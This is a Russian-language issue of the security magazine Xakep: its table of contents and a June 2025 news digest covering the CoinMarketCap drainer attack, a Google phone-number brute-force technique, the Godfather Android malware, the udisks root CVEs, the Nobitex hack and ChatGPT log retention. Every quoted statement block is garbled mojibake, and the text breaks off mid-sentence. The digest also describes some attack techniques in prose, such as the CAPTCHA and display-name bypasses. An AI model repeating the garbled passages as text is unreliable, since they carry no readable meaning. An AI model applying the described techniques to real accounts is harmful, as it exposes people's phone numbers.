
            № 315
CONTENTS


   MEGANews
  Cамые важные события в мире инфосека за июнь

     Positive Hack Days Fest 3
  Как прошел киберфестиваль и почему на нем стоило быть

   В обход песочниц
  Детектим сэндбоксы VirusTotal и Kaspersky, чтобы спрятать вредоносный код

    Отладка по хардкору
  Реверсим ARM-приложение для QNX в QEMU

    Негодный парсинг
  Злоупотребляем косяками разбора JSON, XML и YAML в программах на Go

    HTB Haze
  Атакуем мониторинг Splunk, чтобы захватить сервер на Windows

    HTB Checker
  Редактируем разделяемую память для инъекции команд ОС

    HTB Backre
  Эксплуатируем уязвимости в популярных C2-фреймворках

    HTB Inltrator
  Раскручиваем цепочку уязвимостей при атаке на Active Directory

    HTB Titanic
  Эксплуатируем RCE в ImageMagick

    Тонкости passkeys
  Разбираем сильные и слабые стороны нового способа аутентификации

    Криптовалютный дренаж
  Разбираемся с дрейнерами — новым видом скама, опустошающим криптокошельки

    Деанон на Android
  Как Meta и «Яндекс» раскрывают личность пользователей через свои приложения

    Автозапутыватель
  Обфусцируем код при помощи LLVM

     Flux на стероидах
  Ускоряем генерацию картинок при помощи сжатых моделей

    Ушедшая классика
  Вспоминаем Mac OS 9 — последнюю версию классической ОС Apple
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru


В   этом   месяце:   хакеры   атакова ли   пользователей
CoinMarketCap, исследователь подоб рал номера телефонов
для акка унтов Google, вышла Kali Linux 2025.2 с тринадцатью
новыми инструмен тами, средс тва криптобиржи Nobitex укра -
ли и уничтожили, у почтового хос тера Cock(.)li утекли данные
мил лиона человек, а также другие важные и интерес ные
события июня.





ВЗЛОМ
COINMARKETCAP
По пулярный сайт для отслежива ния кур сов криптовалют CoinMarketCap пос -
традал от хакерской атаки. Злоумышленни ки пытались похитить криптовалюту
у посетителей ресурса.
  Все началось с того, что пользователи CoinMarketCap заметили стран ные
всплывающие окна, которые пред лагали им под ключить кошельки к сайту.
Если люди следова ли инс трукциям, вредонос ный скрипт похищал у них крип -
товалю ту.





Вскоре представители компании подтвердили, что злоумыш ленники исполь -
зовали уязвимость в дудле (анимированном логотипе ком пании) на глав ной
стра нице сай та и внедрили на стра ницы ресурса вредоносный JavaScript.
   Раз работ чики CoinMarketCap пишут:


      20 èþíÿ 2025 ãîäà íàøà êîìàíäà ïî áåçîïàñ íîñòè îáíà ðóæèëà óÿç -
      âèìîñòü, ñâÿçàííóþ ñ èçîáðàæåíèåì äóä ëà íà íàøåé äîìàø íåé ñòðà -«
      íèöå. Ýòî èçîáðàæåíèå ñîäåð æàëî ññûëêó, êîòîðàÿ çàïóñ êàëà âðå -
      äîíîñ íûé êîä ÷åðåç âûçîâ API, ÷òî ïðèâîäèëî ê ïîÿâ ëåíèþ âñïëû -
     âàþùå ãî îêíà ïðè ïîñåùå íèè äîìàø íåé ñòðà íèöû ó íåêîòîðûõ ïîëü -
      çîâàòå ëåé. Îáíà ðóæèâ ýòî, ìû íåçàìåä ëèòåëüíî óäà ëèëè ïðîáëåìíûé
      êîíòåíò, îïðå äåëèëè ïåð âîïðè÷èíó è ïðèíÿëè êîì ïëåêñíûå ìåðû
      ïî èçîëÿöèè è óñòðà íåíèþ ïðîáëåìû. Â íàñ òîÿùåå âðå ìÿ âñå ñèñ -
     òåìû ðàáîòà þò øòàòíî, à CoinMarketCap áåçîïà ñåí äëÿ âñåõ ïîëü -
      çîâàòå ëåé.                »
Как объясни ли специалисты ИБ-компании c/side, злоумышленни ки каким-то
обра зом изменили API, с помощью которо го сайт загружал дудл для отоб -
ражения на глав ной странице. В подмененный JSON-ответ был добавлен
вре доносный  тег  script,  внедрявший  скрипт  для  кра жи  криптовалюты
из кошельков, который под гружался с внешнего сай та (static.cdnkit(.)io).
   Ког да пользователь заходил на стра ницу, скрипт выполнялся и отоб ражал
фальшивое  всплывающее  окно  для  подключения  кошелька,  имитируя
легитимный запрос на Web3-транзакцию. Однако на самом деле скрипт был
предназна чен для кражи активов из подключенных кошельков.

      Ýòî áûëà àòà êà íà öåïî÷ êó ïîñ òàâîê, òî åñòü âçëîì áûë íàï ðàâëåí
      íå íà ñîáñ òâåííûå ñåð âåðû CoinMarketCap, à íà ñòîðîííèé èíñ òðó -«
      ìåíò  èëè  ðåñóðñ,  èñïîëüçóåìûé  CoinMarketCap,  —  ïîÿñ íÿþò
      â c/side. — Òàêèå àòà êè ñëîæíî îáíà ðóæèòü, ïîñ êîëüêó îíè èñïîëüçóþò
      äîâåðåííûå ýëå ìåíòû ïëàòôîðìû.                »
Позже исследова тель, известный под ником Rey, поделил ся деталями этой
ата ки. На опуб ликованных им скриншотах вид но,  что  в рамках  атаки
у 110 жертв было укра дено 43 266 дол ларов в криптовалю те, а участники ата -
ки говори ли на фран цуз ском язы ке в сво ем Telegram-канале.
  В отличие от традици онного фишин га, крип товалютные дрейнеры чаще
всего продвигаются через посты в соци альных сетях, рек ламу, поддельные
сай ты и вредонос ные рас ширения для браузеров.
   Сог ласно отчетам исследова телей, только в 2024 году злоумышленни ки
похити ли почти 500 миллионов долларов в результате подобных  атак,
нацеленных более чем на 300 тысяч кошельков. Совсем недавно мы пос -
вятили этой проблеме от дельную статью .


РАСКРЫВАЕМОСТЬ ВЗЛОМОВ — 2%

По информации МВД России, в 2024 году количество преступлений, связанных со взло мом
компь ютерной информа ции, уве личи лось в три раза — с 36 200 до 104 600 .

При этом из них было раскрыто лишь 2100 прес тупле ний, то есть 2,07% .

В МВД связыва ют рост преступлений с «при мене нием схемы мошенничества в отношении мик -
рофинансовых организаций с исполь зованием неправомер ного доступа к учетным записям
пользователей» портала «Госуслуги». На такие случаи приходится 90% от всех преступлений
со взло мом.





ТЕЛЕФОНЫ
ОТ GOOGLE-
АККАУНТОВ
Незави симый исследователь обнаружил  уязвимость, которая позволяла
подобрать номер телефо на для любого аккаунта Google. Проб лема соз -
давала серьезные рис ки фишинговых атак и атак на подмену SIM-карт.
  Проб лему нашел ИБ-специалист, извес тный под псевдонимом BruteCat.
Напомним, что в начале текущего года он рассказывал о другом баге , бла -
года ря которому можно было узнать адрес элек тронной почты для любого
акка унта на YouTube.
  Новая атака строится вокруг использования устаревшей формы Google
с отклю ченным  JavaScript  (accounts.google(.)com/signin/usernamerecovery),
в которой отсутство вали сов ременные механизмы защиты от злоупот ребле -
ний.
   Эта страница создавалась для того, что бы поль зователи мог ли проверить,
свя зан ли резервный адрес электронной почты или номер телефо на с опре -
деленным отображаемым именем — display name (например, John Smith).
   Как объясня ет BruteCat в своем отчете, в итоге новая атака позволяла
узнать номер телефона, который человек исполь зовал, настраивая восста -
нов ление для аккаунта Google. В подавляющем большинстве случаев этот
номер совпада ет с основным телефонным номером жертвы.
   Старая форма без JavaScript помога ла узнать, связан ли конкретный
номер телефона с аккаунтом Google, с помощью пары запросов, основыва -
ясь на отоб ража емом име ни поль зователя.
  Ис сле дователь без тру да обошел примитивную защиту от мас совых зап -
росов, реализованную в этой форме, используя ротацию IPv6-адресов
для генера ции триллионов уникаль ных IP через под сети /64.
  Об мануть CAPTCHA, которая отоб ражалась при зап росах, удалось, под -
ста вив в параметр bgresponse=js_disabled действи тельный токен BotGuard,
взя тый из формы с под держкой JS.





В итоге специалист создал брутфорс-инструмент, который перебирал диапа -
зоны номеров, используя форматы, характерные для разных стран, и отфиль -
тровывал ложные сра баты вания.
   Также  BruteCat  использовал  решение  libphonenumber  от  Google
для генера ции корректных форматов номеров, создал базу масок телефон -
ных номеров разных стран для опре деле ния фор матов номеров по регионам,
а также написал скрипт для генера ции токенов BotGuard через headless
Chrome.
  В результате получилось решение, способное осуществлять перебор
со скоростью около 40 тысяч зап росов в секунду. Таким образом, на поиск
телефонных номеров в США требова лось около 20 мин, в Великобритании —
4 мин, в Нидерландах — менее 15 с, а в Сингапуре — менее 5 с.





Но чтобы провести атаку на конкретного человека, тре бова лось выпол нить
еще нес коль ко дополнительных шагов. Дело в том, что еще несколько лет
назад узнать чужой display name не сос тавляло тру да, но с 2023 года раз -
работчики Google начали скрывать отобража емое имя, если перед этим
не было взаимодействия между жертвой и атакующим, а в 2024 году прак -
тичес ки полностью отключили отоб ражение display name для большинства
сервисов.
   BruteCat обна ружил, что для обхода этих ограничений можно соз дать
документ Looker Studio и наз начить жертву его вла дельцем (используя ее
адрес на Gmail). В этом слу чае отоб ража емое имя учетной записи Google
появ лялось  в  Looker  Studio,  где поль зователь  становился  владельцем
документа.
  Воору жив шись  полученной  информа цией,  ата кующий  получал  воз -
можность выполнять пов торяющиеся зап росы, чтобы извлечь все телефон -
ные номера, связан ные с кон крет ным display name.
  Пос коль ку учетных записей с оди наковыми отоб ражаемы ми именами мог -
ли быть тысячи, исследова тель сужал круг поиска, исполь зуя час тичный
номер телефона цели. Чтобы узнать час тичный номер телефона жер твы, он
воспользовался    функцией    восста новления     аккаунта    Google
(https://g(.)co/AccountRecoveryRequest), которая позволяет уви деть две пос -
ледние циф ры номера, исполь зующе гося для вос ста новления (нап ример, **
******03).
   BruteCat отмечает:

     Âðå ìÿ áðóòôîðñà ìîæíî çíà ÷èòåëüíî ñîê ðàòèòü çà ñ÷åò ïîä ñêà çîê
      î íîìåðå òåëåôîíà, âçÿòûõ èç ïðîöåäó ðû ñáðîñà ïàðîëÿ â äðó ãèõ ñåð -«
      âèñàõ (íàï ðèìåð, PayPal), êîòîðûå ïîêàçû âàþò åùå íåñ êîëüêî öèôð
      (íàï ðèìåð, +14*****1779).                »
Видеодемонс тра цию  экс плу атации  этой  уязвимости мож но  увидеть  на
YouTube .
  Ис ходно BruteCat уведомил Google о проблеме через программу bug
bounty в апреле 2025 года. Одна ко тог да разработчики Google сочли риски
от уязвимости низ кими, и толь ко 22 мая 2025 года ком пания повысила уро -
вень опасности этой проблемы до среднего и при менила вре менные меры
для ее устранения. В итоге BruteCat получил за свою находку вознаграждение
в раз мере 5000 долларов.
   6 июня 2025 года Google окончатель но закрыла доступ к уязвимому эндпо -
инту без JavaScript. То есть осу ществить описан ную исследователем атаку
уже  нель зя, одна ко  неизвес тно, не  использовались  ли обнаруженные
BruteCat проблемы злоумышленниками ранее.


НОВЫЙ МОЩНЕЙШИЙ DDOS В ИСТОРИИ
Компания Cloudare сообщила, что еще в мае 2025 года она нейтрализовала мощнейшую
на данный момент DDoS-ата ку, пиковая мощность которой достигла 7,3 Тбит/с . Атака была
нап равлена на неназ ванного хостинг-провайдера.





Ата ка на 12% превзошла предыду щий рекорд, уста нов ленный в январе текущего года и сос -
тавлявший 5,6 Тбит/с.

Все го за 45 с был передан огромный объем данных — 37,4 Тбайт . Это эквивалентно примерно
7500 ч потокового HD-вещания или передаче 12 500 000 фотог рафий в фор мате JPEG.

Ата ка исходила со 122 145 IP-адре сов. Основными источни ками тра фика стали: Бразилия,
Вьетнам, Индонезия, Китай, Саудовская Ара вия, США, Таиланд, Тайвань, Украина и Эква дор.





Основной объем трафика атакующих представлял собой UDP-флуд ( 99,996% от обще го объ -
ема тра фика).





KALI LINUX 2025.2
Второй в этом году релиз Kali Linux (2025.2) уже доступен для загрузки, осна -
щен тринад цатью новыми инс тру ментами и получил рас ширенные воз -
можности для взлома автомоби лей.
  В этом выпус ке разработчики добавили мно жес тво новых функций и усо -
вершенс твовали пользовательский интерфейс. Сре ди заметных изменений
можно выделить:
 • пере именова ние и обновле ние набора инс тру ментов для взлома авто -
  моби лей;
 • обновление меню и поль зовательского интерфей са Kali;
 • обновление Kali NetHunter;
 • новые инс тру менты для хакинга.

С релизом Kali Linux 2025.2 CAN Arsenal был переиме нован в CARsenal, что
лучше отражает пред назначение набора инструмен тов, ориентированного
на взлом автомоби лей. Кро ме того, теперь он обладает более удобным
интерфейсом.
  В обновленный CARsenal вошли следующие новые инструмен ты:
 • hlcand — модифицированный slcand для исполь зования ELM327;
 • VIN Info — расшифровывает VIN-номер;
 • CaringCaribou — пре дос тавля ет модули Listener, Dump, Fuzzer, Send, UDS
   и XCP;
 • ICSim — симуля тор VCAN для тес тирования CARsenal без необходимости
   использования аппаратных средств.

Ме ню Kali было реорганизовано в соответс твии с MITRE ATT&CK, что должно
упростить поиск нужных инструментов как для красных, так и для синих
команд. Ранее  структура меню  строилась на  старых системах (WHAX
и BackTrack), которые затрудня ли мас штабиро вание и добавление новых инс -
трумен тов, что вызывало путаницу при попытке найти похожие инструменты.





    Ìû ñîç äàëè íîâóþ ñèñ òåìó è àâòîìàòèçèðîâàëè ìíîãèå àñïåêòû, ÷òî
      îáëåã÷à åò íàì óïðàâëå íèå, à âàì — ïîèñê. Âñå â âûèãðûøå. Ñî âðå -«
     ìåíåì ìû íàäå åìñÿ äîáàâèòü âñå ýòî íà ñàéò kali.org/tools/, — ïèøóò
      ðàç ðàáîò÷èêè Kali Team. — Îäíà êî â íàñ òîÿùåå âðå ìÿ Kali Purple âñå
     åùå èñïîëüçóåò NIST CSF (National Institute of Standards and Technology
       Cybersecurity Framework), à íå MITRE D3FEND.                »
Также сле дует отметить, что GNOME обновился до вер сии 48, а KDE
Plasma — до версии 6.3; пользователь ский интерфейс стал более четким,
темы были улучшены, а приложение для чтения документов Evince заменили
новым при ложением Papers.
   Что касается новых инструментов, их в Kali Linux 2025.2 насчитывается
целых тринад цать:
 • azurehound — сбор щик данных BloodHound из Microsoft Azure;
 • binwalk3 — инструмент для ана лиза прошивок;
 • bloodhound-ce-python — сборщик данных для BloodHound CE на базе
   Python;
 • bopscrk — генератор умных и эффективных спис ков слов;
 • chisel-common-binaries — готовые бинарники для chisel;
 • crlfuzz — быс трый инструмент для проверки CRLF-уязвимостей, написан -
  ный на Go (добавлено @Arszilla );
 • donut-shellcode —  генера тор  позиционно  независимо го  шелл-кода
   с запуском из памяти;
 • gitxray — сканирует репозитории GitHub и контрибьюторов для сбора дан -
   ных (добав лено @weirdlantern );
 • ldeep — ути лита для глу бокой энумерации LDAP;
 • ligolo-ng-common-binaries — готовые бинарники для Advanced ligolo-ng;
 • rubeus — инструмент для низ коуров невых операций с Kerberos и проведе -
   ния атак;
 • sharphound — сбор щик для BloodHound CE;
 •  tinja — CLI-инструмент для тес тирования веб-страниц на предмет инъ -
   екций шаб лонов.

По мимо перечис ленного, в Kali Linux 2025.2 появилась под держка беспро -
водных инъ екций, деаутентифика ции и перех вата хен дшейков WPA2 для пер -
вых смарт-часов TicWatch Pro 3 (все вари анты с чип сетом bcm43436b0).





Кро ме того, коман да Kali подели лась тизером , демонстрирующим работу Kali
NetHunter KeX на голов ных устройствах Android Auto, и пред ста вила новые
и обновлен ные ядра Kali NetHunter, включая:
 • Xiaomi Redmi 4/4X (A13, новое от @MomboteQ );
 • Xiaomi Redmi Note 11 (A15, новое от @Madara273 );
 • Realme C15 (A10) (обновление от @Frostleaft07 );
 • Samsung Galaxy S10 (A14, A15, exynos9820, обновле ние от @V0lk3n );
 • Samsung Galaxy S9 (A13, exynos9810, обновление от @V0lk3n ).


ДУРОВ ОТВЕТИЛ НА ОБВИНЕНИЯ





Па вел Дуров выступил на конференции, посвященной пра вам челове ка (организована меж -
дународ ной НКО Human Rights House Foundation, деятель ность которой приз нана нежелатель -
ной в РФ).
   В начале своего выступле ния основатель Telegram отве тил на обви нения в том, что он
зависим от той или иной государс твенной структуры:

        Я русский и скорее умру, чем стану чьим-либо акти вом. Полагаю, люди,
       которые высказывают такое мнение, мало знают о моем жизненном пути —
      о том, чем я занимал ся до Telegram, какую роль «ВКонтакте» и Telegram сыграли
       в воп росах защиты свободы, выражения мнений, свободы собраний и неп -
       рикосновенности частной жизни в Восточной Евро пе.





                                     Продолжение статьи →
 Начало статьи
ANDROID-МАЛВАРЬ
С ВИРТУАЛИЗАЦИЕЙ
Но вая версия Android-мал вари Godfather создает изолированные виртуаль -
ные сре ды на мобиль ных устрой ствах, чтобы похищать данные из банковских
приложе ний.
  Впервые Godfather был замечен еще в мар те 2021 года иссле дователя ми
из компании ThreatFabric. С тех пор банкер претер пел заметные изменения
и сильно отли чает ся от последнего образца, изученного Group-IB в декаб -
ре 2022 года. Тогда вредонос атаковал 400 криптовалютных и банковских
приложе ний в 16 странах мира, используя HTML-оверлеи.
   Как теперь расска зали спе циалисты Zimperium, нашед шие новую модифи -
кацию Godfather, мал варь выполняет ся на устройстве в кон тролируемой вир -
туальной сре де, что поз воляет в режиме реального вре мени шпионить,
похищать учет ные данные, а также манипу лиро вать тран закци ями, при этом
сохраняя надежную мас кировку.
  Впервые подоб ная тактика была примене на в кон це 2023 года в малвари
FjordPhantom  для  Android,  которая  тоже  исполь зовала  вир туализацию
для выпол нения банков ских приложений внут ри контейнеров, чтобы избежать
обна ружения.
  Од нако  если  FjordPhantom  был  нацелен  только  на  пользователей
из Юго-Восточной Азии, то область атак Godfather гораздо шире: он нацелен
более чем на 500 банковских, криптовалютных и e-commerce-приложений
по всему миру. В ата ках Godfather применяется виртуальная файловая сис -
тема, виртуальный идентификатор про цесса, под мена Intent’ов и StubActivity.
  В резуль тате, по словам экспертов, пользователь видит только реальный
интерфейс при ложения, а защит ные механизмы Android не замечают вре -
донос ной активности, пос кольку в манифес те заявлены только действия
хост-при ложения.
   Godfather распростра няет ся в фор мате APK-фай ла, содержащего встро -
енный фрей мворк  виртуали зации. Малварь  исполь зует  для  перехвата
вызовов такие опенсорсные инструменты, как VirtualApp и Xposed.
  Пос ле акти вации на устройстве жертвы вредонос проверяет наличие уста -
нов ленных целевых приложений и, если они най дены, помещает их в свою
виртуальную среду, используя StubActivity для запуска внутри хост-контей -
нера.
   StubActivity фактичес ки является пустышкой, под ставной  Activity, встро -
енной во вредоносный APK с движком вир туализации. Она не имеет UI
или собс твенной логики — служит лишь прокси, соз дает кон тейнер и запус -
кает нас тоящие Activity из целевых (нап ример, банковских) приложений внут -
ри виртуальной среды. Тем самым Godfather обманывает Android, заставляя
систему считать, что запус кается легитим ное приложение, тог да как на самом
деле малварь перехватывает и кон тролирует его.
   Ког да  поль зователь  запускает  настоящее  бан ковское  приложе ние,
Godfather, ранее получивший раз решение на использование  Accessibility
Service, перехватыва ет  Intent и перенаправляет его в StubActivity внутри
хост-при ложения. В итоге виртуализиро ванная копия банковского приложе -
ния запус кает ся внут ри контейнера. Таким обра зом, поль зователь видит
реаль ный интерфейс при ложения, но все связанные с ним конфиденциаль -
ные данные могут быть лег ко перехвачены.
   Упомяну тый выше Xposed при меняется для  API-хукинга, и  Godfather
получа ет воз можность сохранять учет ные данные, пароли, PIN-коды, отсле -
живать касания и получать ответы от банков ского бэкенда.





Кро ме того, в клю чевые моменты мал варь отоб ражает поддельный оверлей,
чтобы обма ном вынудить жертву ввес ти PIN-код или пароль.
  Пос ле сбора и передачи всех данных сво им операторам Godfather ожи -
дает даль нейшей команды от хакеров, чтобы разблокировать устройство,
совершить опре деленные операции  с  пользовательским интерфейсом,
открыть при ложе ние и осущес твить платеж или перевод из нас тояще го бан -
ковского приложения.
  При чем поль зователь в это время видит фальшивый экран «обновле ния»
или черный экран, чтобы подоз рительная активность не привлекла его вни -
мание.
   Хотя обна руженная Zimperium кам пания нацеле на только на ряд турец ких
банковских приложений, исследователи предупреждают, что дру гие опе рато -
ры Godfather могут выбрать любые подмножес тва из 500 целевых приложе ний
для атаки на другие реги оны.


ТРАФИК CLOUDFLARE СНИЗИЛСЯ НА 30%
С начала июня 2025 года трафик Cloudare в России снизился пример но на треть .





При этом более 40% сайтов в Рунете исполь зуют Cloudare (около 300 тысяч ресур сов),
и око ло 45% сайтов малого и среднего биз неса используют бесплатные сертификаты Let’s
Encrypt от Cloudare.


Хо тя ранее Роскомнад зор призывал вла дель цев россий ских интернет-ресур сов отказать ся
от использования сервиса, сей час в ведомстве объясни ли сни жение объемов трафика проб -
лемами у «отдельных зарубежных хостинг-провай деров».





ПРОБЛЕМЫ UDISKS
Две све жие уяз вимос ти локаль ного повыше ния привиле гий могут исполь -
зовать ся  для  получе ния   root-при вилегий  в  системах,  работающих
под управле нием популяр ных дис три бутивов Linux.
  Первая ошиб ка ( CVE-2025-6018 ) была обнаружена в кон фигурации фрей -
мворка Pluggable Authentication Modules (PAM) в openSUSE Leap 15 и SUSE
Linux Enterprise 15. Проблема поз воляет локальным атакующим получить при -
виле гии поль зователя allow_active.
   Вторая ошибка  ( CVE-2025-6019 ) обнаружена в libblockdev и позволяет
пользователю allow_active получить права root через демон udisks (служ ба
управления хра нени ем данных, которая по умолчанию используется в боль -
шинс тве дис три бутивов Linux).
   Хотя объ единение этих уязвимос тей в цепочку local-to-root поз воляет зло -
умышленни кам быстро получить root-при вилегии и полностью зах ватить кон -
троль над системой, под черки вается, что проблема libblockdev/udisks чрез -
вычай но опас на даже сама по себе.

      Õîòÿ ôîð ìàëüíî äëÿ ýêñ ïëó àòà öèè óÿç âèìîñ òè òðå áóþòñÿ ïðèâèëå ãèè
       allow_active, ïî óìîë÷àíèþ udisks âõîäèò â ñîñ òàâ ïî÷ òè âñåõ äèñ òðè -«
      áóòèâîâ Linux, ïîýòîìó ïðàê òè÷åñ êè ëþáàÿ ñèñ òåìà óÿç âèìà, — îáú -
      ÿñíèëè ýêñïåð òû Qualys Threat Research Unit, îáíà ðóæèâ øèå îáå ïðîá -
      ëåìû. — Òåõíèêè ïîëó÷å íèÿ ïðàâ  allow_active, âêëþ ÷àÿ ðàñ êðû òóþ
     âûøå ïðîáëåìó ñ PAM, åùå áîëüøå ñíèæàþò ýòîò áàðüåð. Çëîóìûø -
      ëåííèê ìîæåò èñïîëüçîâàòü ýòè óÿç âèìîñ òè äëÿ íåìåä ëåííîé êîì ïðî -
      ìåòà öèè ñèñ òåìû ñ ìèíèìàëüíûìè óñèëèÿìè.                »
Специалис ты Qualys создали PoC-экс пло иты и успешно применили уяз -
вимость CVE-2025-6019 для получения root-прав в системах под управлением
Ubuntu, Debian, Fedora и openSUSE Leap 15.
  В своем отчете команда Qualys Security Advisory поделилась более под -
        тех нической информа цией об уяз вимостях:


      Ó÷èòûâàÿ ïîâ ñåìåñ òíîå ðàñ ïðîñòðà íåíèå udisks è ïðîñ òîòó ýêñ ïëó àòà -
      öèè, îðãà íèçà öèè äîëæíû ðàñ ñìàòðèâàòü ýòó óÿç âèìîñòü êàê êðèòè÷åñ -робной«
      êèé è ïîñ òîÿííûé ðèñê è íåçàìåä ëèòåëüíî ðàç âåðíóòü èñïðàâ ëåíèÿ.                »
Ссылки на исправления можно най ти в Openwall .


COOKIE В ДАРКНЕТЕ
Ана литики NordVPN подсчитали, что в даркне те и в Telegram продаются миллиарды украденных
файлов cookie. Около 7–9% этих cookie все еще активны и могут исполь зоваться зло умыш -
ленни ками.

Суммарно преступникам доступны для покуп ки более 93,7 миллиарда файлов cookie.

Подавляющее боль шинство украденных cookie  ( 90,25% ) содержат данные, которые пред -
назначены для идентифика ции пользовате лей и доставки целевой рекламы.


Также cookie могут содержать име на, домашние адре са и адре са электронной поч ты, данные
местоположения, пароли, номера телефонов. Но такая информа ция присутствует толь ко
в 0,5% всех украденных cookie.





Еще сookie могут содержать сведения о сеансах пользователей. Более 1,2 мил лиарда таких
файлов все еще активны (примерно 6% от общего числа).

Чаще все го cookie попада ют в руки злоумыш ленни ков благода ря инфостилерам. Лидером
в этой области исследова тели наз вали стилер Redline (с ним были связаны 44% всех обна -
руженных файлов cookie). Второе, третье и четвертое места в списке занимают Vidar ,
LummaC2 и Meta .





УНИЧТОЖЕНИЕ
АКТИВОВ NOBITEX
Про израиль ская хакгруппа Predatory Sparrow взя ла на себя ответс твенность
за взлом крупнейшей иранской криптобиржи  Nobitex. Хакеры похитили
более 90 миллионов долларов в криптовалюте и умышленно «сожгли» эти
средства.

     Ñå ãîä íÿ óòðîì 19 èþíÿ íàøà òåõíè÷åñ êàÿ êîìàíäà îáíà ðóæèëà ïðèç -
      íàêè íåñàíêöèîíèðîâàííîãî äîñ òóïà ê ÷àñ òè íàøåé èíôðàñòðóê òóðû«
      è ãîðÿ÷å ìó êîøåëüêó, — ãëà ñèò îôèöèàëüíîå ñîîáùåíèå Nobitex. —
     Ñðà çó æå ïîñ ëå îáíà ðóæå íèÿ èíöèäåíòà âñå äîñ òóïû áûëè îòîç âàíû,
      è íàøè âíóòðåííèå ñïå öèàëèñ òû ïî áåçîïàñ íîñòè òùà òåëüíî ðàñ ñëå -
      äóþò ìàñ øòà áû èíöèäåíòà.                »
Вскоре пос ле этого груп пиров ка Predatory Sparrow взяла на себя ответс твен -
ность за ата ку. В соцсети X хакеры пообещали вскоре опубликовать исходные
коды Nobitex и внут реннюю информацию, похищен ную в резуль тате взло ма.
Атакующие предупрежда ют, что после пуб ликации данных любые активы,
которые останутся на Nobitex, «будут под угро зой»:

     Áèð æà Nobitex ÿâëÿåòñÿ ñåð äöåì óñèëèé ðåæèìà ïî ôèíàíñèðîâà íèþ
      òåð ðîðà ïî âñå ìó ìèðó, à òàê æå ëþáèìûì èíñ òðó ìåíòîì ðåæèìà«
      äëÿ íàðóøå íèÿ ñàíêöèé.                »
Блокчейн-аналити ки из компании Elliptic рас сказали, что из кошельков Nobitex
было украдено более 90 миллионов долларов в крип товалю те, пос ле чего эти
средства нап равились на адреса, контролируемые хакерами.
  Но похоже, Predatory Sparrow не пыталась извлечь выгоду из этого взлома.
Дело в том, что хакгруппа отправила поч ти всю крип товалюту на vanity-адреса
с анти исламскими сообщени ями (например, F%ckIRGCterrorists).
  Ис сле дователи объ яснили, что для создания таких адре сов требуются
огромные вычис литель ные мощности и соз дание  столь длинных  строк
в vanity-адресах невозможно технически. То есть хакеры намеренно «сож гли»
криптовалю ту, чтобы никто не смог получить к ней дос туп.

      Ýòà  àòà êà  íå  âûãëÿäèò  ôèíàíñîâî  ìîòèâèðîâàííîé, —  ïèøóò
      â  Elliptic. — Vanity-àäðå ñà, èñïîëüçîâàííûå õàêåðà ìè, ãåíåðèðóþòñÿ«
      ïîñ ðåäñ òâîì áðóòôîðñà — ñ ïîìîùüþ ñîç äàíèÿ áîëüøîãî êîëè÷åñ òâà
      ïàð êðèï òîãðà ôè÷åñ êèõ êëþ ÷åé, ïîêà îäíà èç íèõ íå áóäåò ñîäåð æàòü
      íóæíûé òåêñò. Íî ñîç äàíèå vanity-àäðå ñîâ ñ òàêèìè äëèííûìè òåê ñòî -
     âûìè ñòðîêàìè, êàêèå èñïîëüçîâàëèñü â ýòîì ñëó ÷àå, íåâûïîëíèìî
      ñ âû÷èñ ëèòåëüíîé òî÷ êè çðå íèÿ.                »
Стоит отме тить, что за день до атаки Nobitex группиров ка Predatory Sparrow
взломала иранский банк Bank Sepah. Эта атака тоже была ориентирована
на нарушение работы банка и нанесе ние ущер ба, и хакеры не преследовали
финансовую выгоду.


ШАДАЕВ О КАДРАХ В ИТ





Выступая на форуме на TAdviser Summit, министр цифрового развития свя зи и массовых ком -
муника ций Максут Шада ев рассказал, что число ИТ-специалис тов в Рос сии превыси ло миллион
человек и спрос на них сохраня ется, хотя сейчас востре бованы более опытные кадры:

        Пока мы не видим какой-то тотальной заморозки найма и того, что ком -
       пании, условно, увольняют айтиш ников, потому что искусственный интеллект
      пишет код и они больше не нуж ны. Нам кажет ся, что здесь такой ажиотаж нем -
      ножко раз дутый. За пять лет количество сот рудни ков ИТ-компаний увеличилось
       на 50%. Их было 990 тысяч на конец 2024 года, а сейчас мы, оче видно,
      перешаг нули миллион. В целом, я считаю, спрос остается.
         Дру гое дело, что ажиотаж привел к тому, что очень многие пошли в эту про -
      фессию, прошли курсы онлайн, сейчас они джуны, которые говорят, что они все
      умеют, а компаниям нужны мидлы, нужны силь ные раз работчики. В этом есть
      проблема.
          (Все больше) людей хочет устро иться в индустрию, но качество их под готов -
       ки пока не соответствует ожидани ям наших крупных компаний, потому что они
       как раз идут в сторону все более слож ных разработок.
        Но потребность в кадрах в моем понимании остается. И я призываю молодое
       поколение связывать свою судьбу с ИТ. Толь ко чуть-чуть надо смещать ся в сто -
       рону робото техники, ИИ — это более слож ные специаль ности, но прогресс неос -
       тановим





CHATGPT ЗАПОМНИТ
ВСЕ
Пользователей OpenAI обеспокоило постановление суда, в котором ком -
панию обя зали сохранять журналы чатов с ChatGPT, включая удаленные. Ком -
пания уже подала апелляцию на пос танов ление, утверждая, что оно зат -
рагива ет лич ную жизнь сотен миллионов поль зователей ChatGPT по всему
миру.
  В офи циальном заявлении COO OpenAI Брэд Лай ткэп (Brad Lightcap) объ -
яснил, что пос тановление суда было вынесе но по иску The New York Times
и других новос тных орга низаций. Истцы утвержда ют, что удаленные беседы
с чат-ботом могут содержать доказательства того, что пользователи побуж -
дали ChatGPT генерировать тек сты, в которых могли воспроизводиться фраг -
менты статей, защищенных авторским правом (нап ример, материалы новос -
тных изданий).
  Дело в том, что, по заявлени ям истцов, OpenAI неправомерно исполь-
зовала их материалы для обучения своих моделей. В итоге модели могут
генери ровать очень близкие к оригина лу тексты и выдавать целые отрывки
из защищен ных авторским правом публикаций.
  Решение суда о сох ранении логов было вынесено после того, как новос -
тные орга низа ции выразили обес покоенность тем, что люди, использующие
ChatGPT для обхода плат ного доступа, могут быть напуганы ходом раз -
биратель ства и «уда лят все свои поисковые запросы и промпты, чтобы
замести следы».
   Чтобы выполнить судеб ное пред писание, OpenAI обязана «хранить весь
пользовательский контент в течение неопределенного периода времени»,
основыва ясь на пред положении, что истцы могут найти в логах «что-то, под -
твержда ющее их доводы», объ ясняют в компании.
  Пос тановление зат рагивает все чаты поль зовате лей ChatGPT Free, Plus
и Pro, а так же поль зователей API OpenAI. При этом под черкивается, что пос -
танов ление не каса ется кли ентов ChatGPT Enterprise или ChatGPT Edu, а так -
же всех, кто заключил сог лашение Zero Data Retention (по сути, спе циальный
режим работы с API компании, при котором данные пользовате ля вооб ще
не сох раняются и не используются ни для анализа, ни для обучения моделей).
  В OpenAI сооб щают, что уже подали ходатайство о приостановлении
